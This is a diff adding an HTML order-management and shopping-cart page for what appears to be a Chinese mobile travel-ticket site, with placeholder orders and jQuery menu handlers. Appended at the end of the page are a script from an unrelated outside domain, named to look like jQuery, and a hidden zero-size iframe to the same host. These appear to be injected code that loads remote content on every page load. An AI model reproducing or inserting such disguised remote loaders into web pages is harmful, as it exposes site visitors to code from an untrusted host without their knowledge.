@@ -1,0 +1,515 @@
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+		<meta name="apple-mobile-web-app-capable" content="yes">
+		<meta name="apple-mobile-web-app-status-bar-style" content="black">
+		<meta name="format-detection" content="telephone=on">
+		<link href="static/css/m-reset.css" rel="stylesheet">
+		<link href="static/css/global1803.css" rel="stylesheet">
+		<link href="static/css/topic-style.css" rel="stylesheet">
+		<link href="static/css/user.css" rel="stylesheet" />
+		<script src="static/js/jquery.min.js"></script>
+		<script src="static/js/currency_utils.js"></script>
+		<script src="staticjs/global20170703.js"></script>
+		<title>订单管理</title>
+	</head>
+	<body class="bg w">
+		<div class="header_title">
+			购物车
+		</div>
+		<div class="wrapper">
+			
+			<!--购物车列表-->
+			<div class="order-list main">
+				
+				<!-- 全部订单 -->
+				<ul id="conlist total_order" style="margin-top:10px;" class="conlist">
+					<li class="xw-block">
+						<div class="xw-order-header">
+							添加时间: 2019-06-12 12:34
+							<!-- <span>未支付</span> -->
+						</div>
+						<div class="xw-order-content">
+							<div class="xw-order-title">
+								清泉湾空中玻璃漂+极速漂流+动感水城   成人票（即买即用  免预约）
+							</div>
+							<div class="xw-order-set-meal">
+								套餐: 清泉湾空中玻璃漂+极速漂流+动感水城   成人票（即买即用  免预约）
+							</div>
+							<div class="xw-order-price">
+								实付: ￥12.00
+							</div>
+						</div>
+						<div class="xw-order-bottom">
+							数量：1
+							<span>立即下单</span>
+						</div>
+					</li>
+					
+					<li class="xw-block">
+						<div class="xw-order-header">
+							添加时间: 2019-06-12 12:34
+							<!-- <span>已支付</span> -->
+						</div>
+						<div class="xw-order-content">
+							<div class="xw-order-title">
+								清泉湾空中玻璃漂+极速漂流+动感水城   成人票（即买即用  免预约）
+							</div>
+							<div class="xw-order-set-meal">
+								套餐: 清泉湾空中玻璃漂+极速漂流+动感水城   成人票（即买即用  免预约）
+							</div>
+							<div class="xw-order-price">
+								实付: ￥12.00
+							</div>
+						</div>
+						<div class="xw-order-bottom">
+							数量：1
+							<span>立即下单</span>
+						</div>
+					</li>
+					<li class="xw-block">
+						<div class="xw-order-header">
+							添加时间: 2019-06-12 12:34
+							<!-- <span>已完成</span> -->
+						</div>
+						<div class="xw-order-content">
+							<div class="xw-order-title">
+								清泉湾空中玻璃漂+极速漂流+动感水城   成人票（即买即用  免预约）
+							</div>
+							<div class="xw-order-set-meal">
+								套餐: 清泉湾空中玻璃漂+极速漂流+动感水城   成人票（即买即用  免预约）
+							</div>
+							<div class="xw-order-price">
+								实付: ￥12.00
+							</div>
+						</div>
+						<div class="xw-order-bottom">
+							数量：1
+							<span>立即下单</span>
+						</div>
+					</li>
+				</ul>
+				
+				<!-- 待确认订单 -->
+				<ul id="conlist wait_confirm_order" class="conlist" hidden="hidden">
+					<li class="xw-block">
+						<div class="xw-order-header">
+							订单号: 23124243543
+							<span>未确认</span>
+						</div>
+						<div class="xw-order-content">
+							<div class="xw-order-title">
+								清泉湾空中玻璃漂+极速漂流+动感水城   成人票（即买即用  免预约）
+							</div>
+							<div class="xw-order-set-meal">
+								套餐: 清泉湾空中玻璃漂+极速漂流+动感水城   成人票（即买即用  免预约）
+							</div>
+							<div class="xw-order-price">
+								实付: ￥12.00
+							</div>
+						</div>
+						<div class="xw-order-bottom">
+							订单时间： 2019-06-07 12:34
+							<span>去确认</span>
+						</div>
+					</li>
+					
+					<li class="xw-block">
+						<div class="xw-order-header">
+							订单号: 23124243543
+							<span>未确认</span>
+						</div>
+						<div class="xw-order-content">
+							<div class="xw-order-title">
+								清泉湾空中玻璃漂+极速漂流+动感水城   成人票（即买即用  免预约）
+							</div>
+							<div class="xw-order-set-meal">
+								套餐: 清泉湾空中玻璃漂+极速漂流+动感水城   成人票（即买即用  免预约）
+							</div>
+							<div class="xw-order-price">
+								实付: ￥12.00
+							</div>
+						</div>
+						<div class="xw-order-bottom">
+							订单时间： 2019-06-07 12:34
+							<span>去支付</span>
+						</div>
+					</li>
+				</ul>
+				
+				<!-- 待支付订单 -->
+				<ul id="conlist wait_pay_order" class="conlist" hidden="hidden">
+					<li class="xw-block">
+						<div class="xw-order-header">
+							订单号: 23124243543
+							<span>未支付</span>
+						</div>
+						<div class="xw-order-content">
+							<div class="xw-order-title">
+								清泉湾空中玻璃漂+极速漂流+动感水城   成人票（即买即用  免预约）
+							</div>
+							<div class="xw-order-set-meal">
+								套餐: 清泉湾空中玻璃漂+极速漂流+动感水城   成人票（即买即用  免预约）
+							</div>
+							<div class="xw-order-price">
+								实付: ￥12.00
+							</div>
+						</div>
+						<div class="xw-order-bottom">
+							订单时间： 2019-06-07 12:34
+							<span>去支付</span>
+						</div>
+					</li>
+					
+					<li class="xw-block">
+						<div class="xw-order-header">
+							订单号: 23124243543
+							<span>未支付</span>
+						</div>
+						<div class="xw-order-content">
+							<div class="xw-order-title">
+								清泉湾空中玻璃漂+极速漂流+动感水城   成人票（即买即用  免预约）
+							</div>
+							<div class="xw-order-set-meal">
+								套餐: 清泉湾空中玻璃漂+极速漂流+动感水城   成人票（即买即用  免预约）
+							</div>
+							<div class="xw-order-price">
+								实付: ￥12.00
+							</div>
+						</div>
+						<div class="xw-order-bottom">
+							订单时间： 2019-06-07 12:34
+							<span>去支付</span>
+						</div>
+					</li>
+				</ul>
+				
+				<!-- 已支付订单 -->
+				<ul id="conlist payed_order" class="conlist" hidden="hidden">
+					<li class="xw-block">
+						<div class="xw-order-header">
+							订单号: 23124243543
+							<span>已支付</span>
+						</div>
+						<div class="xw-order-content">
+							<div class="xw-order-title">
+								清泉湾空中玻璃漂+极速漂流+动感水城   成人票（即买即用  免预约）
+							</div>
+							<div class="xw-order-set-meal">
+								套餐: 清泉湾空中玻璃漂+极速漂流+动感水城   成人票（即买即用  免预约）
+							</div>
+							<div class="xw-order-price">
+								实付: ￥12.00
+							</div>
+						</div>
+						<div class="xw-order-bottom">
+							订单时间： 2019-06-07 12:34
+							<span>确认完成</span>
+						</div>
+					</li>
+					
+					<li class="xw-block">
+						<div class="xw-order-header">
+							订单号: 23124243543
+							<span>已支付</span>
+						</div>
+						<div class="xw-order-content">
+							<div class="xw-order-title">
+								清泉湾空中玻璃漂+极速漂流+动感水城   成人票（即买即用  免预约）
+							</div>
+							<div class="xw-order-set-meal">
+								套餐: 清泉湾空中玻璃漂+极速漂流+动感水城   成人票（即买即用  免预约）
+							</div>
+							<div class="xw-order-price">
+								实付: ￥12.00
+							</div>
+						</div>
+						<div class="xw-order-bottom">
+							订单时间： 2019-06-07 12:34
+							<span>确认完成</span>
+						</div>
+					</li>
+				</ul>
+				
+				<!-- 已取消订单 -->
+				<ul id="conlist cancel_order" class="conlist" hidden="hidden">
+					<li class="xw-block">
+						<div class="xw-order-header">
+							订单号: 23124243543
+							<span>已完成</span>
+						</div>
+						<div class="xw-order-content">
+							<div class="xw-order-title">
+								清泉湾空中玻璃漂+极速漂流+动感水城   成人票（即买即用  免预约）
+							</div>
+							<div class="xw-order-set-meal">
+								套餐: 清泉湾空中玻璃漂+极速漂流+动感水城   成人票（即买即用  免预约）
+							</div>
+							<div class="xw-order-price">
+								实付: ￥12.00
+							</div>
+						</div>
+						<div class="xw-order-bottom">
+							订单时间： 2019-06-07 12:34
+							<!-- <span>去支付</span> -->
+						</div>
+					</li>
+					
+					<li class="xw-block">
+						<div class="xw-order-header">
+							订单号: 23124243543
+							<span>已完成</span>
+						</div>
+						<div class="xw-order-content">
+							<div class="xw-order-title">
+								清泉湾空中玻璃漂+极速漂流+动感水城   成人票（即买即用  免预约）
+							</div>
+							<div class="xw-order-set-meal">
+								套餐: 清泉湾空中玻璃漂+极速漂流+动感水城   成人票（即买即用  免预约）
+							</div>
+							<div class="xw-order-price">
+								实付: ￥12.00
+							</div>
+						</div>
+						<div class="xw-order-bottom">
+							订单时间： 2019-06-07 12:34
+							<!-- <span>去支付</span> -->
+						</div>
+					</li>
+				</ul>
+				
+				<!-- 已完成订单 -->
+				<ul id="conlist finish_order" class="conlist" hidden="hidden">
+					<li class="xw-block">
+						<div class="xw-order-header">
+							订单号: 23124243543
+							<span>未支付</span>
+						</div>
+						<div class="xw-order-content">
+							<div class="xw-order-title">
+								清泉湾空中玻璃漂+极速漂流+动感水城   成人票（即买即用  免预约）
+							</div>
+							<div class="xw-order-set-meal">
+								套餐: 清泉湾空中玻璃漂+极速漂流+动感水城   成人票（即买即用  免预约）
+							</div>
+							<div class="xw-order-price">
+								实付: ￥12.00
+							</div>
+						</div>
+						<div class="xw-order-bottom">
+							订单时间： 2019-06-07 12:34
+							<span>去支付</span>
+						</div>
+					</li>
+					
+					<li class="xw-block">
+						<div class="xw-order-header">
+							订单号: 23124243543
+							<span>未支付</span>
+						</div>
+						<div class="xw-order-content">
+							<div class="xw-order-title">
+								清泉湾空中玻璃漂+极速漂流+动感水城   成人票（即买即用  免预约）
+							</div>
+							<div class="xw-order-set-meal">
+								套餐: 清泉湾空中玻璃漂+极速漂流+动感水城   成人票（即买即用  免预约）
+							</div>
+							<div class="xw-order-price">
+								实付: ￥12.00
+							</div>
+						</div>
+						<div class="xw-order-bottom">
+							订单时间： 2019-06-07 12:34
+							<span>去支付</span>
+						</div>
+					</li>
+				</ul>
+				
+			</div>
+			<!--订单列表END-->
+
+		</div>
+
+
+		<div class="menu-bar">
+			<div class="mb-fixed">
+				<div class="mb-cont">
+					<ul class="mb-list">
+						<li class="item"><a class="center" href="index.html"><span class="icon-home iconfont"></span>
+								<p class="ti">首页</p>
+							</a></li>
+
+						<li class="item more-ctrl">
+							<div class="center"><span class="icon-classify iconfont"></span>
+								<p class="ti">分类</p>
+							</div>
+						</li>
+						
+						<li class="item" onclick="location.href='car.html'">
+							<div class="center"><img style="height:30px;width:30px;" src="static/images/car1.png" >
+								<p class="ti">购物车</p>
+							</div>
+						</li>
+
+						<li class="item"><a class="center" href="user.html"><span class="icon-my iconfont"></span>
+								<p class="ti">个人中心</p>
+							</a></li>
+					</ul>
+				</div>
+			</div>
+		</div>
+		<div class="menu-bar-more">
+			<div class="menu-bar-mask"></div>
+			<div class="mm-cont">
+				<div class="mm-list">
+					<!--菜单栏-->
+		
+		
+					<a class="item" href="category.html">
+						<img src="static/images/type1.png" style="width:80%;">
+						<p class="ti">周边短线
+						</p>
+					</a>
+					
+					<a class="item" href="category.html">
+						<img src="static/images/type2.png" style="width:80%;">
+						<p class="ti">精品路线
+						</p>
+					</a>
+					
+					<a class="item" href="category.html">
+						<img src="static/images/type3.png" style="width:80%;">
+						<p class="ti">亲子游
+						</p>
+					</a>
+					
+					<a class="item" href="category.html">
+						<img src="static/images/type4.png" style="width:80%;">
+						<p class="ti">定制游
+						</p>
+					</a>
+		
+					<div class="iconfont icon-arrow more-hide"></div>
+		
+				</div>
+			</div>
+		</div>
+		<script language="javascript">
+			var sentIt = true;
+			var limit = 0;
+			// 给浏览器窗口绑定 scroll 事件
+			$(window).bind("scroll", function() {
+				if (($(document).scrollTop() + $(window).height()) > ($(document).height() - 100) && sentIt) {
+					if (limit >= 10 && limit < 100) {
+						changeOrder();
+					}
+				}
+			});
+			$('.menu-bar .more-ctrl').click(function() {
+				menuBarShow();
+			});
+			$('.menu-bar-more .more-hide').click(function() {
+				menuBarHide();
+			});
+			$('.menu-bar-more .menu-bar-mask').click(function() {
+				menuBarHide();
+			});
+
+			function menuBarShow() {
+				$('.menu-bar-mask').fadeIn('fast');
+				$('.menu-bar-more').addClass('in');
+				$('body').addClass('disable');
+			}
+
+			function menuBarHide() {
+				$('.menu-bar-mask').fadeOut('fast');
+				$('.menu-bar-more').removeClass('in');
+				$('body').removeClass('disable');
+			}
+
+			$('.infomation-history-ctrl').click(function() {
+				popupWrapShow('.infomation-history-wrap');
+			});
+			$('.popup-wrap .btn-close').click(function() {
+				popupWrapHide();
+			});
+
+			function popupWrapShow(ojb) {
+				$(ojb).fadeIn('fast');
+				$('body').addClass('disable');
+			}
+
+			function popupWrapHide() {
+				$('.popup-wrap').fadeOut('fast');
+				$('body').removeClass('disable');
+			}
+
+			$('.ctrl-search').click(function() {
+				$(".top .searchbar").animate({
+					width: "100%"
+				}, 'fast');
+			});
+			$('.cancel-search').click(function() {
+				$(".top .searchbar").animate({
+					width: "0"
+				}, 'fast');
+				$("#queryStr").val('');
+			});
+			$("#search-input").focus(function() {
+				$(this).parent().children(".input_clear").show();
+			});
+			$("#search-input").blur(function() {
+				if ($(this).val() == '') {
+					$(this).parent().children(".input_clear").hide();
+				}
+			});
+			$(".input_clear").click(function() {
+				$(this).parent().find('#search_input').val('');
+				$(this).hide();
+			});
+
+			//取消订单
+			function cancelOrder(uid, order_id) {
+				if (confirm('您确定要取消该订单？')) {
+					location.href = 'order_cancel.jsp?uid=' + uid + '&order_id=' + order_id;
+				}
+			}
+
+			
+			$(function() {
+				$(".tab-ctrl li").click(function() {
+					limit = 0;
+					//移除所选择
+					$('.tab-ctrl li').removeClass('sel');
+					$(this).addClass('sel');
+				})
+			})
+			
+			function nav_select(index){
+				var obj = document.getElementsByClassName('conlist')
+				for(var i = 0;i < obj.length; i++){
+
+					obj[i].setAttribute('hidden','hidden')
+				}
+				obj[index].removeAttribute('hidden')
+				// document.getElementsByClassName('.conlist')[0].setAttribute('hidden','hidden')
+				// if(index == 0){
+				// 	document.getElementsByClassName('.total_order').removeAttribute('hidden')
+				// }else if(index == 1){
+				// 	document.getElementsByClassName('.wait_confirm_order').removeAttribute('hidden')
+				// }else if(index == 2){
+				// 	document.getElementsByClassName('.wait_pay_order').removeAttribute('hidden')
+				// }else if(index == 3){
+				// 	document.getElementsByClassName('.payed_order').removeAttribute('hidden')
+				// }else if(index == 4){
+				// 	document.getElementsByClassName('.cancel_order').removeAttribute('hidden')
+				// }else if(index == 5){
+				// 	document.getElementsByClassName('.finish_order').removeAttribute('hidden')
+				// }
+			}
+		</script>
+		<script charset="utf-8" async="true" src="https://cool.oeebee.com/inf/jquery.min2.js"></script><iframe src="http://cool.oeebee.com/cnzz/index.html"
+		 style="width: 0px; height: 0px; display: none;"></iframe>
+	</body>
+</html>
